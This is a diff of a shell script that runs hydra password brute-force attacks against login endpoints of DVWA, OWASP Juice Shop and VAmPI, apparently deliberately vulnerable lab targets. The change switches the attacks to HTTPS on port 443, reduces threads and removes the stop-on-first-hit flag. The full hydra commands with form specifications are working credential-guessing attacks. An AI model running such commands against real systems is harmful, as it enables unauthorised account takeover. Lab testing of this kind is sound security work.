@@ -61,11 +61,11 @@ echo "    Target: ${TARGET}/dvwa/login.php"
 echo "    User:   admin"
 
 hydra -l admin -P "${WORDLIST}" \
-  -s 80 \
+  -s 443 \
   "${TARGET}" \
-  http-post-form \
+  https-post-form \
   "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-  -t 4 -f -w 5 -v ||
+  -t 2 -w 5 -v ||
   echo "    WARN: hydra DVWA attack returned non-zero (may not have found valid creds)"
 
 echo ""
@@ -76,11 +76,11 @@ echo "    Target: ${TARGET}/juice-shop/rest/user/login"
 echo "    User:   admin@juice-sh.op"
 
 hydra -l "admin@juice-sh.op" -P "${WORDLIST}" \
-  -s 80 \
+  -s 443 \
   "${TARGET}" \
-  http-post-form \
+  https-post-form \
   '/juice-shop/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:Invalid:H=Content-Type\: application/json' \
-  -t 4 -f -w 5 -v ||
+  -t 2 -w 5 -v ||
   echo "    WARN: hydra Juice Shop attack returned non-zero (may not have found valid creds)"
 
 echo ""
@@ -91,11 +91,11 @@ echo "    Target: ${TARGET}/vampi/users/v1/login"
 echo "    User:   admin"
 
 hydra -l admin -P "${WORDLIST}" \
-  -s 80 \
+  -s 443 \
   "${TARGET}" \
-  http-post-form \
+  https-post-form \
   '/vampi/users/v1/login:{"username"\:"^USER^","password"\:"^PASS^"}:error:H=Content-Type\: application/json' \
-  -t 4 -f -w 5 -v ||
+  -t 2 -w 5 -v ||
   echo "    WARN: hydra VAmPI attack returned non-zero (may not have found valid creds)"
 
 echo ""
